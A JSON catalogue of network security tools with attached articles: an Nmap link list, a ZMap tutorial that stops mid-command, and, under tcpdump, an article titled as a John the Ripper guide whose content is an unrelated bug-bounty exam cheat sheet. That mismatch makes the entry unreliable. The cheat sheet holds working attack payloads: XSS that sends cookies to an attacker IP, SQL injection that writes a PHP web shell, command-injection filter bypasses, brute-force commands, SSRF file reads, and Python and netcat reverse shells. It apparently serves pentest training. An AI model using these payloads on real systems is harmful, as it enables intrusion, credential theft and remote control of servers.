[
  {
    "name": "Masscan",
    "description": "The fastest Internet port scanner, asynchronous.",
    "category": "Network Scanning & Analysis",
    "tags": [
      "fast port scanning",
      "large networks"
    ],
    "color": "#56e54b"
  },
  {
    "name": "Nmap",
    "description": "Network discovery and security auditing tool.",
    "category": "Network Scanning & Analysis",
    "tags": [
      "port scanning",
      "service detection",
      "OS detection"
    ],
    "articles": [
      {
        "title": "Nmap for Pentester",
        "content": "# Nmap for Pentester\n\nThis cheatsheet was created to assist Red Teamers and Penetration Testers in hunting down vulnerabilities using \"Nmap.\" It is designed such that beginners can understand the fundamentals and professionals can brush up their skills with the advanced options. There are multiple ways to perform all the mentioned tasks, so we've performed them all and compiled this list with our experience. Please share it with your connections and send your queries and feedback directly to [Aarti Singh](https://www.linkedin.com/in/aarti--singh/).\n\n# Follow us on [![alt text](http://i.imgur.com/tXSoThF.png)](http://www.twitter.com/hackinarticles)\n\n![cheatsheet](https://github.com/Ignitetechnologies/Mindmap/blob/main/Nmap/nmap%20UHD.png?raw=true)\n\n1. [Host Discovery](https://www.hackingarticles.in/nmap-for-pentester-host-discovery/)\n2. [Output Format Scan](https://www.hackingarticles.in/nmap-for-pentester-output-format-scan/)\n3. [Understanding Nmap Packet Trace](https://www.hackingarticles.in/understanding-nmap-packet-trace/)\n4. [Nmap Scan with Timing Parameters](https://www.hackingarticles.in/nmap-scan-with-timing-parameters/)\n5. [Nmap Scans using Hex Value of Flags](https://www.hackingarticles.in/nmap-scans-using-hex-value-flags/)\n6. [Forensic Investigation of Nmap Scan using Wireshark](https://www.hackingarticles.in/forensic-investigation-of-nmap-scan-using-wireshark/)\n7. [Nmap for Pentester: Timing Scan](https://www.hackingarticles.in/nmap-for-pentester-timing-scan/)\n8. [Nmap for Pentester: Ping Scan](https://www.hackingarticles.in/nmap-for-pentester-ping-scan/)\n9. [Nmap for Pentester: Port Status](https://www.hackingarticles.in/nmap-for-pentester-port-status/)\n10. [How to Detect NMAP Scan Using Snort](https://www.hackingarticles.in/detect-nmap-scan-using-snort/)\n11. [Understanding Guide to Nmap Firewall Scan (Part 2)](https://www.hackingarticles.in/understanding-guide-nmap-firewall-scan-part-2/)\n12. [Understanding Guide to Nmap Firewall Scan (Part 1)](https://www.hackingarticles.in/understanding-guide-nmap-firewall-scan-part-1/)\n13. [Understanding Nmap Scan with Wireshark](https://www.hackingarticles.in/understanding-nmap-scan-wireshark/)\n14. [Password Cracking using Nmap](https://www.hackingarticles.in/nmap-for-pentester-password-cracking/)\n15. [Vulnerability Scan](https://www.hackingarticles.in/nmap-for-pentester-vulnerability-scan/)\n16. [Network Scanning using NMAP (Beginner Guide)](https://www.hackingarticles.in/network-scanning-using-nmap-beginner-guide/)\n17. [MSSQL Penetration Testing using Nmap](https://www.hackingarticles.in/mssql-for-pentesternmap/)\n18. [MySQL Penetration Testing with Nmap](https://www.hackingarticles.in/mysql-penetration-testing-nmap/)"
      }
    ],
    "color": "#e54b4b"
  },
  {
    "name": "Wireshark",
    "description": "Network protocol analyzer for deep packet inspection.",
    "category": "Network Scanning & Analysis",
    "tags": [
      "packet analysis",
      "troubleshooting",
      "pcap"
    ],
    "color": "#4be5d0"
  },
  {
    "name": "tcpdump",
    "description": "A powerful command-line packet analyzer.",
    "category": "Network Scanning & Analysis",
    "tags": [
      "packet capture",
      "cli",
      "network monitoring"
    ],
    "color": "#a04be5",
    "articles": [
      {
        "title": "John the Ripper (JtR) – Complete Guide & How‑to Use it Safely",
        "content": "# HTB-certified-bug-bounty-hunter-exam-cheetsheet\nAll cheetsheets with main information about CBBH role path in one place.\n\n# Information Gathering\n\n### WHOIS\n\n| Command                    | Description                               |\n|----------------------------|-------------------------------------------|\n| ```nslookup <target>```          | Identify A record for the target domain.  |\n| ```export TARGET=\"domain.tld\"``` | Assign target to an environment variable. |\n| ```whois $TARGET```              | WHOIS lookup for the target.              |\n\n### DNS Enumeration\n\n| Command                          | Description                                        |\n|----------------------------------|----------------------------------------------------|\n| ```nslookup $TARGET```                 | Identify the A record for the target domain.       |\n| ```nslookup -query=A $TARGET```        | Identify the A record for the target domain.       |\n| ```dig <TARGET> @<nameserver/IP>```    | Identify the A record for the target domain.       |\n| ```dig a $TARGET @<nameserver/IP>```   | Identify the A record for the target domain.       |\n| ```nslookup -query=PTR <IP>```         | Identify the PTR record for the target IP address. |\n| ```dig -x <IP> @<nameserver/IP>```     | Identify the PTR record for the target IP address. |\n| ```nslookup -query=ANY $TARGET```      | Identify ANY records for the target domain.        |\n| ```dig any $TARGET @<nameserver/IP>``` | Identify ANY records for the target domain.        |\n| ```nslookup -query=TXT $TARGET```      | Identify the TXT records for the target domain.    |\n| ```dig txt $TARGET @<nameserver/IP>``` | Identify the TXT records for the target domain.    |\n| ```nslookup -query=MX $TARGET```       | Identify the MX records for the target domain.     |\n| ```dig mx $TARGET @<nameserver/IP>```  | Identify the MX records for the target domain.     |\n\n### Passive Subdomain Enumeration\n\n| Resource/Command                                      | Description                                                         |\n|-------------------------------------------------------|---------------------------------------------------------------------|\n| VirusTotal                                            | https://www.virustotal.com/gui/home/url                             |\n| Censys                                                | https://censys.io/                                                  |\n| Crt.sh                                                | https://crt.sh/                                                     |\n| ```curl -s https://sonar.omnisint.io/subdomains/{domain} \\| jq -r '.[]' sort -u```| All subdomains for a given domain.              |\n| ```curl -s https://sonar.omnisint.io/tlds/{domain}        jq -r '.[]' sort -u``` | All TLDs found for a given domain.              |\n| ```curl -s https://sonar.omnisint.io/all/{domain}         jq -r '.[]' sort -u``` | All results across all TLDs for a given domain. |\n| ```curl -s https://sonar.omnisint.io/reverse/{ip}         jq -r '.[]' sort -u``` | Reverse DNS lookup on IP address.               |\n| ```curl -s https://sonar.omnisint.io/reverse/{ip}/{mask}  jq -r '.[]' sort -u``` | Reverse DNS lookup of a CIDR range.             |\n| ```curl -s \"https://crt.sh/?q=${TARGET}&output=json\"      jq -r '.[] \"\\(.name_value)\\n\\(.common_name)\"' sort -u ``` |              |\n\n### Certificate Transparency.\n\n``` cat sources.txt \\| while read source; do theHarvester -d \"${TARGET}\" -b $source -f \"${source}-${TARGET}\";done ```\n\nSearching for subdomains and other information on the sources provided in the source.txt list.\n\n### Passive Infrastructure Identification\n\n| Resource/Command                                     | Description                                                |\n|------------------------------------------------------|------------------------------------------------------------|\n| Netcraft                                             | https://www.netcraft.com/                                  |\n| WayBackMachine                                       | http://web.archive.org/                                    |\n| WayBackURLs                                          | https://github.com/tomnomnom/waybackurls                   |\n| waybackurls -dates https://$TARGET > waybackurls.txt | Crawling URLs from a domain with the date it was obtained. |\n\n### Active Infrastructure Identification\n\n| Resource/Command                                                      | Description                                   |\n|-----------------------------------------------------------------------|-----------------------------------------------|\n| ```curl -I \"http://${TARGET}\"```                                            | Display HTTP headers of the target webserver. |\n| ```whatweb -a https://www.facebook.com -v```                                | Technology identification.                    |\n| Wappalyzer                                                            | https://www.wappalyzer.com/                   |\n| ```wafw00f -v https://$TARGET```                                            | WAF Fingerprinting.                           |\n| Aquatone                                                              | https://github.com/michenriksen/aquatone      |\n| ```cat subdomain.list  aquatone -out ./aquatone -screenshot-timeout 1000``` | Makes screenshots of all subdomains in the    |\n| subdomain.list.                                                       |                                               |\n\n### Active Subdomain Enumeration\n\n| Resource/Command                                                                                         | Description                                                                |\n|----------------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------|\n| HackerTarget                                                                                             | https://hackertarget.com/zone-transfer/                                    |\n| SecLists                                                                                                 | https://github.com/danielmiessler/SecLists                                 |\n| ```nslookup -type=any -query=AXFR $TARGET nameserver.target.domain ```                                         | Zone Transfer using Nslookup against the target domain and its nameserver. |                                                        \n| ```gobuster dns -q -r \"${NS}\" -d \"${TARGET}\" -w \"${WORDLIST}\" -p ./patterns.txt -o \"gobuster_${TARGET}.txt\"``` | Bruteforcing     subdomains.                                               |\n\n### Virtual Hosts\n\n| Resource/Command                                                                                                                | Description                                                               |\n|---------------------------------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------------|\n| ```curl -s http://192.168.10.10 -H \"Host: randomtarget.com\" ```                                                                       | Changing the HOST HTTP header to request a specific domain.               |\n| ```cat ./vhosts.list  while read vhost;do echo \"\\n********\\nFUZZING: ${vhost}\\n********\";curl -s -I http://<IP address>  -H \"HOST: ${vhost}.target.domain\" \\| grep \"Content-Length: \";done``` |Bruteforcing for possible virtual hosts on the target domain.   |                                                                         |\n| ```ffuf -w ./vhosts -u http://<IP address> -H \"HOST: FUZZ.target.domain\" -fs 612```                                                   | Bruteforcing for possible virtual hosts on  the target domain using ffuf. |                                                             \n\n### Crawling\n\n| Resource/Command                                                                                                                                   | Description                                                                   |\n|----------------------------------------------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------|\n| ZAP                                                                                                                                                | https://www.zaproxy.org/                                                      |\n| ```ffuf -recursion -recursion-depth 1 -u http://192.168.10.10/FUZZ -w /opt/useful/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt``` | Discovering files and folders that cannot be spotted by browsing the website. |\n| ```ffuf -w ./folders.txt:FOLDERS,./wordlist.txt:WORDLIST,./extensions.txt:EXTENSIONS -u http://www.target.domain/FOLDERS/WORDLISTEXTENSIONS```           | Mutated bruteforcing against the target web server.                           |\n\n# Javascript deobfuscation\n\n| Websites            | \n|---------------------|\n| JS Console Prettier |\n| Beautifier          |\n| JSNice              |\n\n# Cross-site scripting (XSS)\n\n| Code                                                                                              | Description                    |\n|---------------------------------------------------------------------------------------------------|--------------------------------|\n| ```<script>alert(window.origin)</script>```                                                       | \tBasic XSS Payload             |\n| ```<plaintext>```                                                                                 | \tBasic XSS Payload             |\n| ```<script>print()</script>```                                                                    | \tBasic XSS Payload             |\n| ```<img src=\"\" onerror=alert(window.origin)>```                                                   | \tHTML-based XSS Payload        |\n| ```<script>document.body.style.background = \"#141d2b\"</script>```                                 | \tChange Background Color       |\n| ```<script>document.body.background = \"https://www.hackthebox.eu/images/logo-htb.svg\"</script>``` | \tChange Background Image       |\n| ```<script>document.title = 'HackTheBox Academy'</script>```                                      | \tChange Website Title          |\n| ```<script>document.getElementsByTagName('body')\\[0].innerHTML = 'text'</script>```               | \tOverwrite website's main body |\n| ```<script>document.getElementById('urlform').remove();</script>```                               | \tRemove certain HTML element   |\n| ```<script src=\"http://OUR_IP/script.js\"></script>```                                             | \tLoad remote script            |\n| ```<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>```               | \tSend Cookie details to us     |\n\n# SQL injection\n\n| Command                                                                                                                                  | Description                                               |\n|------------------------------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------|\n| ```mysql -u root -h docker.hackthebox.eu -P 3306 -p```                                                                                         | \tlogin to mysql database                                  |\n| ```SHOW DATABASES ```                                                                                                                          | \tList available databases                                 |\n| ```USE users ```                                                                                                                               | \tSwitch to database                                       | \n| ```CREATE TABLE logins (id INT, ...)```                                                                                                        | \tAdd a new table                                          |\n| ```SHOW TABLES ```                                                                                                                             | \tList available tables in current database                |\n| ```DESCRIBE logins ```                                                                                                                         | \tShow table properties and columns                        |\n| ```INSERT INTO table_name VALUES (value_1,..)```                                                                                               | \tAdd values to table                                      |\n| ```INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)```                                                                          | \tAdd values to specific columns in a table                |\n| ```UPDATE table_name SET column1=newvalue1, ... WHERE <condition> ```                                                                          | \tUpdate table values                                      | \n| ```SELECT * FROM table_name```                                                                                                                 | \tShow all columns in a table                              |\n| ```SELECT column1, column2 FROM table_name```                                                                                                  | \tShow specific columns in a table                         |\n| ```DROP TABLE logins```                                                                                                                        | \tDelete a table                                           |\n| ```ALTER TABLE logins ADD newColumn INT```                                                                                                     | \tAdd new column                                           |\n| ```ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn```                                                                                  | \tRename column                                            |\n| ```ALTER TABLE logins MODIFY oldColumn DATE```                                                                                                 | \tChange column datatype                                   |\n| ```ALTER TABLE logins DROP oldColumn```                                                                                                        | \tDelete column                                            | \n| ```SELECT * FROM logins ORDER BY column_1```                                                                                                   | \tSort by column                                           |\n| ```SELECT * FROM logins ORDER BY column_1 DESC```                                                                                              | \tSort by column in descending order                       |\n| ```SELECT * FROM logins ORDER BY column_1 DESC, id ASC```                                                                                      | \tSort by two-columns                                      |\n| ```SELECT * FROM logins LIMIT 2```                                                                                                             | \tOnly show first two results                              |\n| ```SELECT * FROM logins LIMIT 1, 2```                                                                                                          | \tOnly show first two results starting from index 2        |\n| ```SELECT * FROM table_name WHERE <condition>```                                                                                               | \tList results that meet a condition                       |\n| ```SELECT * FROM logins WHERE username LIKE 'admin%'```                                                                                        | \tList results where the name is similar to a given string |\n| ```admin' or '1'='1```                                                                                                                         | \tBasic Auth Bypass                                        |\n| ```admin')-- -```                                                                                                                              | \tBasic Auth Bypass With comments                          | \n| ```' order by 1-- -```                                                                                                                         | \tDetect number of columns using order by                  |\n| ```cn' UNION select 1,2,3-- -```                                                                                                               | \tDetect number of columns using Union injection           |\n| ```cn' UNION select 1,@@version,3,4-- -```                                                                                                     | \tBasic Union injection                                    |\n| ```UNION select username, 2, 3, 4 from passwords-- -```                                                                                        | \tUnion injection for 4 columns                            | \n| ```SELECT @@version ```                                                                                                                        | \tFingerprint MySQL with query output                      |\n| ```SELECT SLEEP(5)```                                                                                                                          | \tFingerprint MySQL with no output                         |\n| ```cn' UNION select 1,database(),2,3-- -```                                                                                                    | \tCurrent database name                                    |\n| ```cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -```                                                                  | \tList all databases                                       |\n| ```cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -```                                 | \tList all tables in a specific database                   |\n| ```cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -```                | \tList all columns in a specific table                     |\n| ```cn' UNION select 1, username, password, 4 from dev.credentials-- -```                                                                       | \tDump data from a table in another database               | \n| ```cn' UNION SELECT 1, user(), 3, 4-- -```                                                                                                     | \tFind current user                                        |\n| ```cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user=\"root\"-- -```                                                               | \tFind if user has admin privileges                        |\n| ```cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee=\"'root'@'localhost'\"-- -``` | \tFind if all user privileges                              |\n| ```cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name=\"secure_file_priv\"-- -``` | \tFind which directories can be accessed through MySQL     |\n| ```cn' UNION SELECT 1, LOAD_FILE(\"/etc/passwd\"), 3, 4-- - ```                                                                                  | \tRead local file                                          |\n| ```select 'file written successfully!' into outfile '/var/www/html/proof.txt'```                                                               | \tWrite a string to a local file                           |\n| ```cn' union select \"\",'<?php system($_REQUEST[0]); ?>', \"\", \"\" into outfile '/var/www/html/shell.php'-- - ```                                 | \tWrite a web shell into the base web directory            |\n\n# Commands injections\n\n| Injection operator | Injected character | URL - encoded character            | Executed Command                            |\n|--------------------|--------------------|------------------------------------|---------------------------------------------|\n| Semicolon          | ;                  | \t%3b                               | \tBoth                                       |\n| New Line \t         | \\n \t               | %0a                                | \tBoth                                       |\n| Background         | \t&                 | \t%26                               | \tBoth (second output generally shown first) |\n| Pipe \t             | \t%7c               | Both (only second output is shown) |\n| AND \t              | && \t               | %26%26 \t                           | Both (only if first succeeds)               |\n| OR                 | \\|\\|               | \t%7c%7c \t                          | Second (only if first fails)                |\n| Sub-Shell \t        | ``                 | %60%60                             | \tBoth (Linux-only)                          |\n| Sub-Shell          | $()                | \t%24%28%29                         | \tBoth (Linux-only)                          |\n### Command injection Bypass\n\n| Command                                                    | Description                                                                       |\n|------------------------------------------------------------|-----------------------------------------------------------------------------------| \n| ```printenv ```\t                                                 | Can be used to view all environment variables                                     | \n| ```%09```                                                        | \tUsing tabs instead of spaces                                                     |\n| ```${IFS} ```                                                    | \tWill be replaced with a space and a tab. Cannot be used in sub-shells (i.e. $()) |\n| ```{ls,-la}```                                                   | \tCommas will be replaced with spaces                                              |\n| ```${PATH:0:1}```                                                | \tWill be replaced with /                                                          |\n| ```${LS_COLORS:10:1}```                                          | \tWill be replaced with ;                                                          |\n| ```$(tr '!-}' '\"-~'<<<[)```                                      | \tShift character by one ([ -> \\)                                                  | \n| ```' or \"```                                                     | \tTotal must be even                                                               |\n| ```$@ or \\ ```                                                   | \tLinux only                                                                       | \n| ```$(tr \"[A-Z]\" \"[a-z]\"<<<\"WhOaMi\")```                           | \tExecute command regardless of cases                                              |\n| ```$(a=\"WhOaMi\";printf %s \"${a,,}\") ```\t                         | Another variation of the technique                                                | \n| ```echo 'whoami' \\| rev```                                       | \tReverse a string                                                                 |\n| ```$(rev<<<'imaohw') ```                                         | \tExecute reversed command                                                         | \n| ```echo -n 'cat /etc/passwd```                                   | grep 33' \\| base64 \tEncode a string with base64                                   |                                   \n| ```bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)``` | \tExecute b64 encoded string                                                       |\n#### Windows \n| Command                                                                                                      | Description                                   |\n|--------------------------------------------------------------------------------------------------------------|-----------------------------------------------|\n| ```%09```                                                                                                          | \tUsing tabs instead of spaces                 |\n| ```%PROGRAMFILES:~10,-5%```                                                                                        | \tWill be replaced with a space - (CMD)        |\n| ```$env:PROGRAMFILES\\[10]```                                                                                       | \tWill be replaced with a space - (PowerShell) | \n| ```%HOMEPATH:~0,-17%``` \t                                                                                          | Will be replaced with \\ - (CMD)               |\n| ```$env:HOMEPATH\\[0]``` \t                                                                                          | Will be replaced with \\ - (PowerShell)        |\n| ```' or \"``` \t                                                                                                     | Total must be even                            |\n| ```^```                                                                                                            | \tWindows only (CMD)                           | \n| ```WhoAmi```                                                                                                       | \tSimply send the character with odd cases     | \n| ```\"whoami\"\\[-1..-20] -join ''```                                                                                  | \tReverse a string                             |\n| ```iex \"$('imaohw'\\[-1..-20] -join '')\"```                                                                         | \tExecute reversed command                     | \n| ```[Convert]::ToBase64String(\\[System.Text.Encoding]::Unicode.GetBytes('whoami'))```                              | \tEncode a string with base64                  |\n| ```iex \"$(\\[System.Text.Encoding]::Unicode.GetString(\\[System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))\"``` | \tExecute b64 encoded string                   |\n\n# Login Brute forcing\n\n| Command                                                                                                                              | Description                                          |\n|--------------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------|\n| ```hydra -C wordlist.txt SERVER_IP -s PORT http-get /```                                                                                   | \tBasic Auth Brute Force - Combined Wordlist          |\n| ```hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /```                                                             | \tBasic Auth Brute Force - User/Pass Wordlists        |\n| ```hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form \"/login.php:username=^USER^&password=^PASS^:F=<form name='login'\"``` | \tLogin Form Brute Force - Static User, Pass Wordlist |\n| ```hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4 ```                                                                    | \tSSH Brute Force - User/Pass Wordlists               |\n| ```hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1```                                                                                   | \tFTP Brute Force - Static User, Pass Wordlist        |\n| ```cupp -i```                                                                                                                              | \tCreating Custom Password Wordlist                   |\n| ```sed -ri '/^.{,7}$/d' william.txt```                                                                                                     | \tRemove Passwords Shorter Than 8                     |\n| ```sed -ri '/[!-/:-@\\[-`\\{-~]+/!d' william.txt ```                                                                                         | \tRemove Passwords With No Special Chars              |\n| ```sed -ri '/[0-9]+/!d' william.txt ```                                                                                                    | \tRemove Passwords With No Numbers                    |\n| ```./username-anarchy Bill Gates > bill.txt```                                                                                             | \tGenerate Usernames List                             |\n\n# Server side request forgery\n\n| Command                                                                                                         | Description                                                                     |\n|-----------------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------------------|\n| ```curl -i -s \"http://<TARGET IP>/load?q=http://<VPN/TUN Adapter IP>:8080\" ```                                        | \tTesting for SSRF vulnerability                                                 |\n| ```python3 -m http.server 9090 ```                                                                                    | \tStarting the python web server                                                 |\n| ```sudo pip3 install twisted     ```                                                                                  | \tInstalling the ftp server                                                      |\n| ```sudo python3 -m twisted ftp -p 21 -r . ```                                                                         | \tStarting the ftp server                                                        |\n| ```curl -i -s \"http://<TARGET IP>/load?q=http://<VPN/TUN Adapter IP>:9090/index.html\" ```                             | \tRetrieving a remote file through the target application (HTTP Schema)          |\n| ```curl -i -s \"http://<TARGET IP>/load?q=file:///etc/passwd\" ```                                                      | \tRetrieving a local file through the target application (File Schema)           |\n| ```for port in {1..65535};do echo $port >> ports.txt;done ```                                                         | \tGenerating a wordlist of possible ports                                        |\n| ```ffuf -w ./ports.txt:PORT -u \"http://<TARGET IP>/load?q=http://127.0.0.1:PORT\" -fs 30 ```                           | \tFuzzing for ports on the internal interface                                    |\n| ```curl -i -s \"http://<TARGET IP>/load?q=http://127.0.0.1:5000\" ```                                                   | \tInteracting with the internal interface on the discovered port                 |\n| ```curl -i -s \"http://<TARGET IP>/load?q=http://internal.app.local/load?q=index.html\" ```                             | \tInteracting with the internal application                                      |\n| ```curl -i -s \"http://<TARGET IP>/load?q=http://internal.app.local/load?q=http://127.0.0.1:1\"```                      | \tDiscovering web application listening in on localhost                          |\n| ```curl -i -s \"http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:1\" ```                  | \tModifying the URL to bypass the error message                                  |\n| ```curl -i -s \"http://<TARGET IP>/load?q=http://internal.app.local/load?q=file:://///proc/self/environ\" -o - ```      | \tRequesting to disclose the /proc/self/environ file on the internal application |\n| ```curl -i -s \"http://<TARGET IP>/load?q=http://internal.app.local/load?q=file:://///app/internal_local.py\" ```       | \tRetrieving a local file through the target application                         |\n| ```curl -i -s \"http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=whoami\"``` | \tConfirming remote code exeuction on the remote host                            |\n| ```sudo apt-get install jq```                                                                                         | \tInstalling jq                                                                  |\n\n### Blind SSRF Exploitation Example\n\n| Command                                                                                                                                                                                                                                  | \tDescription                                    |\n|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|-------------------------------------------------|\n| ```nc -lvnp 9090  ```                                                                                                                                                                                                                          | \tStarting a netcat listener                     |\n| ```echo \"\\<B64 encoded response>\" \\| base64 -d   ```                                                                                                                                                                                           | \tDecoding the base64 encoded response           |\n| ```export RHOST=\"<VPN/TUN IP>\";export RPORT=\"<PORT>\";python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));\\[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")' ``` | Reverse shell payload (to be URL encoded twice) |\n\n### SSI Injection Exploitation Example\n### SSI Directive Payload \tDescription\n\n| Command                                                                                                        | Description    |\n|----------------------------------------------------------------------------------------------------------------|----------------|\n| ```<!--#echo var=\"DATE_LOCAL\" -->```                                                                           | \tDate          | \n| ```<!--#printenv -->```                                                                                        | \tAll variables |\n| ```<!--#exec cmd=\"mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo /bin/bash 1>/tmp/foo;rm /tmp/foo\" -->``` | \tReverse Shell |\n\nSSTI Exploitation Example 1\n\n| Command                                                                                              | \tDescription                                                          |\n|------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------|\n| ```curl -X POST -d 'email=${7*7}' http://<TARGET IP>:<PORT>/jointheteam ```                                | \tInteracting with the remote target (Spring payload)                  |\n| ```curl -X POST -d 'email={{_self.env.display(\"TEST\"}}' http://<TARGET IP>:<PORT>/jointheteam ```          | \tInteracting with the remote target (Twig payload)                    |\n| ```curl -X POST -d 'email={{config.items()}}' http://<TARGET IP>:<PORT>/jointheteam ```                    | \tInteracting with the remote target (Jinja2 basic injection)          |\n| ```curl -X POST -d 'email={{ [].class.base.subclasses() }}' http://<TARGET IP>:<PORT>/jointheteam ```      | \tInteracting with the remote target (Jinja2 dump all classes payload) |\n| ```curl -X POST -d \"email={% import os %}{{os.system('whoami')}}\" http://<TARGET IP>:<PORT>/jointheteam``` | \tInteracting with the remote target (Tornado payload)                 |\n| ```curl -gs \"http://<TARGET IP>:<PORT>/execute?cmd={{7*'7'}}\"```                                           | \tInteracting with the remote target (Confirming Jinja2 backend)       |\n| ```./tplmap.py -u 'http://<TARGET IP>:<PORT>/execute?cmd'```                                               | \tAutomating the templating engine identification process with tplmap  |"
      }
    ]
  },
  {
    "name": "ZMap",
    "description": "An open-source network scanner for internet-wide network surveys.",
    "category": "Network Scanning & Analysis",
    "tags": [
      "network survey",
      "fast scanning"
    ],
    "color": "#e5c34b",
    "articles": [
      {
        "title": "ZMap — Detailed Explanation",
        "content": "# ZMap — Detailed Explanation\n\n> This file provides an expanded, **detailed explanation** of each topic from the ZMap guide, written in clean Markdown so you can save it directly as `ZMap_Detailed_Explanation.md` and use it as documentation or training material.\n\n---\n\n## About this document\n\n* **Audience:** researchers, students, system administrators, and security engineers learning ZMap.\n* **Scope:** In-depth explanations, practical commands, expected outputs, troubleshooting tips, safety and ethics notes.\n* **Safety first:** Always run scans only on networks you own or have written permission to test. Use `--dryrun`, small `-n` limits, and isolated environments for practice.\n\n---\n\n## How this file is organized\n\nEach numbered section contains:\n\n1. **What it is / Why it matters** — short conceptual explanation.\n2. **Step-by-step commands** — runnable commands with safe defaults.\n3. **What to expect** — typical output or behavior.\n4. **Troubleshooting & tips** — common problems and fixes.\n5. **Safety / ethics note** — when applicable.\n\n---\n\n## 1. Install ZMap\n\n### What it is / Why it matters\n\nInstalling ZMap from the package manager gives a quick, stable installation suitable for labs. Building from source provides the latest features, probe modules, and bug fixes — useful for development or custom modules.\n\n### Commands (Ubuntu/Debian)\n\n```bash\n# Quick install from package\nsudo apt update\nsudo apt install -y zmap\nzmap --version\n\n# Build from source for latest features (recommended for module development)\nsudo apt install -y build-essential cmake libgmp3-dev gengetopt libpcap-dev flex byacc libjson-c-dev pkg-config libunistring-dev\ngit clone https://github.com/zmap/zmap.git\ncd zmap\ncmake .\nmake -j$(nproc)\nsudo make install\nzmap --version\n```\n\n### What to expect\n\n* `zmap --version` prints installed ZMap version and confirms binary in `$PATH`.\n\n### Troubleshooting & tips\n\n* If `cmake` fails: check installed dependency versions and the output in `CMakeFiles/CMakeError.log`.\n* If `zmap` is not found after `make install`, check `/usr/local/bin` or run `hash -r`.\n\n### Safety / ethics note\n\n* Building from source is safe; be careful when applying third-party patches — review code before running with elevated privileges.\n\n---\n\n## 2. Create an isolated test environment (network namespace)\n\n### What it is / Why it matters\n\nA Linux network namespace provides a sandboxed network stack. Use it to test scanning commands locally without sending traffic to external networks.\n\n### Step-by-step commands\n\n```bash\nsudo ip netns add zmap-lab\nsudo ip link add veth-host type veth peer name veth-ns\nsudo ip link set veth-ns netns zmap-lab\nsudo ip addr add 10.200.200.1/24 dev veth-host\nsudo ip netns exec zmap-lab ip addr add 10.200.200.2/24 dev veth-ns\nsudo ip link set veth-host up\nsudo ip netns exec zmap-lab ip link set lo up\nsudo ip netns exec zmap-lab ip link set veth-ns up\nsudo ip netns exec zmap-lab ping -c 2 10.200.200.1\n```\n\n### What to expect\n\n* The `ping` should reply. Running `zmap` inside the namespace will only use the virtual pair, preventing real-world scans.\n\n### Troubleshooting & tips\n\n* If `ip` commands fail, install `iproute2` (`sudo apt install iproute2`).\n* Clean up the namespace after testing: `sudo ip netns delete zmap-lab` and remove veth on host.\n\n### Safety / ethics note\n\n* This approach is ideal for learning and avoids accidental scanning of Internet hosts.\n\n---\n\n## 3. Single-port scan (safe whitelist)\n\n### What it is / Why it matters\n\nA focused single-port scan helps discover hosts offering a specific service (e.g., HTTP on port 80) within an authorized set of IPs.\n\n### Commands\n\n```bash\necho \"192.0.2.1\" > targets.txt\necho \"192.0.2.2\" >> targets.txt\nsudo zmap -p 80 -w targets.txt -r 50 -f json -o hits.json\njq -c . hits.json | sed -n '1,3p'\n```\n\n### What to expect\n\n* `hits.json` will contain one JSON object per responding host (line-delimited JSON). Each object includes source/destination addresses, ports, timestamp, and classification.\n\n### Troubleshooting & tips\n\n* No results: target might be offline or filtered. Use `--dryrun` to validate packet generation.\n* If running inside a namespace, ensure `-i` and `-S` match the namespace interface and source IP.\n\n### Safety / ethics note\n\n* Use reserved docs/test IPs (e.g., `192.0.2.0/24`) only for examples. Replace with your authorized lab network for real testing.\n\n---\n\n## 4. Target specification: CIDR / whitelist / blacklist\n\n### What it is / Why it matters\n\nPrecision in target selection prevents accidental scanning of sensitive or unauthorized ranges.\n\n### Commands\n\n```bash\nsudo zmap -p 443 10.0.0.0/24 -r 50 -o out.txt\nsudo zmap -p 22 -w whitelist.txt -r 50 -o ssh_hosts.txt\nsudo zmap -p 80 -w large_targets.txt -b exclude.txt -r 100 -o http_hits.txt\n```\n\n`exclude.txt` sample:\n\n```\n203.0.113.5\n198.51.100.0/28\n```\n\n### What to expect\n\n* ZMap reads the whitelist and excludes addresses in the blacklist. Output only contains results for allowed addresses.\n\n### Troubleshooting & tips\n\n* Ensure file paths are accessible and formatted as one network/CIDR per line.\n* If results are unexpectedly empty, double-check that whitelist entries are correct and not unintentionally filtered.\n\n### Safety / ethics note\n\n* Maintain a robust blacklist containing ISP, government, and sensitive hosting ranges.\n\n---\n\n## 5. Probe modules: TCP, UDP, ICMP, DNS\n\n### What it is / Why it matters\n\nProbe modules determine the protocol and probe behavior. Use the right module for target services (e.g., UDP for DNS).\n\n### Commands\n\n```bash\n# TCP SYN (default)\nsudo zmap -p 80 -w targets.txt -r 50 